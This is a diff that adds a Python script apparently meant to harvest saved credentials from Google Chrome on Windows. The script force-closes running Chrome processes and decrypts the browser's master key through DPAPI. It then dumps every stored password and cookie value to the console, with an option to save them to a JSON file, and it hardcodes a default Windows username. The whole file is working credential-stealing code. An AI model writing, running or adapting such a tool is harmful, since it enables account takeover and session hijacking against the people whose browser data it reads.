@@ -1,0 +1,250 @@
+import os
+import json
+import sqlite3
+import base64
+import shutil
+import sys
+import getpass
+import time
+import subprocess
+from datetime import datetime
+try:
+    from Cryptodome.Cipher import AES
+    import win32crypt
+    import psutil
+    prereqs_ok = True
+except ImportError as e:
+    print(f"[-] Missing required package: {e}")
+    print("[-] Please install required packages: pip install pycryptodomex pywin32 psutil")
+    prereqs_ok = False
+
+# Chrome process names
+CHROME_PROCESS_NAMES = ["chrome.exe"]
+
+def close_chrome_processes():
+    """Close Chrome processes to avoid database locks"""
+    closed = False
+
+    try:
+        for proc in psutil.process_iter(['pid', 'name']):
+            if proc.info['name'] and proc.info['name'].lower() in [p.lower() for p in CHROME_PROCESS_NAMES]:
+                print(f"[*] Closing Chrome process: {proc.info['name']} (PID: {proc.info['pid']})")
+                try:
+                    process = psutil.Process(proc.info['pid'])
+                    process.terminate()
+                    closed = True
+                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
+                    print(f"[!] Failed to terminate process {proc.info['name']}: {e}")
+
+        if closed:
+            # Give the OS time to release file locks
+            print("[*] Waiting for Chrome processes to close and release file locks...")
+            time.sleep(2)
+            return True
+        else:
+            print("[*] No Chrome processes found to close.")
+            return False
+    except Exception as e:
+        print(f"[!] Error while closing Chrome processes: {e}")
+        return False
+
+def get_master_key(base_path):
+    local_state_path = os.path.join(base_path, 'Local State')
+    master_key = None
+
+    if not os.path.exists(local_state_path):
+        print(f'[-] Local State not found at {local_state_path}')
+        return None
+
+    try:
+        with open(local_state_path, 'r', encoding='utf-8') as f:
+            ls = json.load(f)
+        encrypted_key = base64.b64decode(ls['os_crypt']['encrypted_key'])
+        encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
+        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        print('[+] Master key decrypted successfully.')
+    except Exception as e:
+        print(f'[-] Failed to get master key: {e}')
+        return None
+
+    return master_key
+
+def decrypt_payload(cipher, payload):
+    return cipher.decrypt(payload)
+
+def generate_cipher(aes_key, iv):
+    return AES.new(aes_key, AES.MODE_GCM, iv)
+
+def decrypt_value(encrypted_value, master_key):
+    if not master_key or not encrypted_value:
+        return 'N/A'
+
+    try:
+        # Try AES-GCM (v10/v11 prefix)
+        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
+            iv = encrypted_value[3:15]
+            payload = encrypted_value[15:]
+            cipher = generate_cipher(master_key, iv)
+            decrypted_pass = decrypt_payload(cipher, payload)
+            decrypted_pass = decrypted_pass[:-16].decode()  # Remove 16-byte auth tag
+            return decrypted_pass
+        else:
+            # Fallback to older DPAPI only
+            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
+    except Exception as e:
+        return f'N/A (Decryption Failed: {str(e)[:50]})'
+
+def extract_data(db_path, master_key, data_type):
+    if not os.path.exists(db_path):
+        print(f'[-] {data_type} file not found: {db_path}')
+        return
+
+    print(f'\n--- Extracting {data_type} from {db_path} ---')
+    temp_dir = os.getenv('TEMP', '.')
+    temp_db_path = os.path.join(temp_dir, f'temp_{data_type.lower().replace(" ", "_")}.db')
+
+    try:
+        shutil.copy2(db_path, temp_db_path)  # Copy to temp to avoid lock
+        conn = sqlite3.connect(temp_db_path)
+        cursor = conn.cursor()
+
+        if data_type == 'Passwords':
+            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+            print('Found passwords:')
+            passwords_data = []
+            for row in cursor.fetchall():
+                origin_url, username, enc_password = row
+                password = decrypt_value(enc_password, master_key)
+                print(f' URL: {origin_url}\n Username: {username}\n Password: {password}\n --------------------')
+                passwords_data.append({
+                    'url': origin_url,
+                    'username': username,
+                    'password': password
+                })
+            return passwords_data
+
+        elif data_type == 'Cookies':
+            cursor.execute('SELECT host_key, name, value, encrypted_value, expires_utc, is_secure, path FROM cookies')
+            print('Found cookies:')
+            cookies_data = []
+            for row in cursor.fetchall():
+                host, name, value, enc_value, expires, secure, path_val = row
+                dec_value = ''
+                if value:
+                    dec_value = value
+                elif enc_value:
+                    dec_value = decrypt_value(enc_value, master_key)
+                print(f' Host: {host}\n Name: {name}\n Value: {dec_value}\n Path: {path_val}\n Secure: {"Yes" if secure else "No"}\n Expires UTC: {expires}\n --------------------')
+                cookies_data.append({
+                    'host': host,
+                    'name': name,
+                    'value': dec_value,
+                    'path': path_val,
+                    'secure': secure,
+                    'expires': expires
+                })
+            return cookies_data
+
+    except sqlite3.Error as e:
+        print(f'[-] SQLite error with {data_type}: {e}')
+    except Exception as e:
+        print(f'[-] Error processing {data_type}: {e}')
+    finally:
+        if 'conn' in locals() and conn:
+            conn.close()
+        if os.path.exists(temp_db_path):
+            os.remove(temp_db_path)
+
+    return []
+
+def extract_chrome_data(username=None, force_close=True):
+    """Extract Chrome passwords and cookies for the specified user or current user"""
+    results = {
+        'passwords': [],
+        'cookies': []
+    }
+
+    # Get current username if not provided
+    if not username:
+        username = "persiannb"
+
+    # Close Chrome processes if requested to avoid database locks
+    if force_close:
+        print("[*] Checking for running Chrome processes...")
+        close_chrome_processes()
+
+    user_profile_path = os.path.join('C:\\Users', username)
+    chrome_user_data_path = os.path.join(user_profile_path, 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
+    default_profile_path = os.path.join(chrome_user_data_path, 'Default')
+
+    print(f'[*] Using Chrome User Data Path: {chrome_user_data_path}')
+    print(f'[*] Using Profile Path: {default_profile_path}')
+
+    if not os.path.isdir(default_profile_path):
+        print(f'[-] Default profile path not found: {default_profile_path}')
+        profiles = []
+
+        if os.path.isdir(chrome_user_data_path):
+            try:
+                profiles = [d for d in os.listdir(chrome_user_data_path)
+                           if os.path.isdir(os.path.join(chrome_user_data_path, d))
+                           and (d == "Default" or d.startswith("Profile"))]
+            except OSError:
+                pass
+
+        if profiles:
+            print(f' Available profiles: {", ".join(profiles)}.')
+            # Try to use the first available profile
+            if profiles:
+                default_profile_path = os.path.join(chrome_user_data_path, profiles[0])
+                print(f'[*] Using alternative profile: {profiles[0]}')
+        else:
+            print(' No profiles found in Chrome User Data path.')
+            return results
+
+    master_key_val = get_master_key(chrome_user_data_path)
+
+    if master_key_val:
+        login_data_db = os.path.join(default_profile_path, 'Login Data')
+        cookies_db = os.path.join(default_profile_path, 'Network', 'Cookies')
+
+        passwords = extract_data(login_data_db, master_key_val, 'Passwords')
+        if passwords:
+            results['passwords'] = passwords
+
+        cookies = extract_data(cookies_db, master_key_val, 'Cookies')
+        if cookies:
+            results['cookies'] = cookies
+    else:
+        print('[-] Master key could not be obtained. Cannot decrypt passwords/cookies.')
+
+    print('\n[*] Extraction attempt finished.')
+    return results
+
+if __name__ == "__main__":
+    if not prereqs_ok:
+        sys.exit(1)
+
+    import argparse
+    parser = argparse.ArgumentParser(description='Extract Chrome credentials')
+    parser.add_argument('--username', '-u', help='Windows username to extract credentials for')
+    parser.add_argument('--no-close', '-n', action='store_true',
+                        help='Do not close Chrome processes (may cause database lock errors)')
+    parser.add_argument('--save', '-s', action='store_true', help='Save results to file')
+
+    args = parser.parse_args()
+    force_close = not args.no_close
+
+    # Extract credentials
+    results = extract_chrome_data(args.username, force_close)
+
+    # Save results to file if requested
+    if args.save and (results['passwords'] or results['cookies']):
+        username = args.username or getpass.getuser()
+        filename = f"chrome_credentials_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+        try:
+            with open(filename, 'w') as f:
+                json.dump(results, f, indent=2)
+            print(f"[+] Results saved to {filename}")
+        except Exception as e:
+            print(f"[-] Failed to save results to file: {e}")
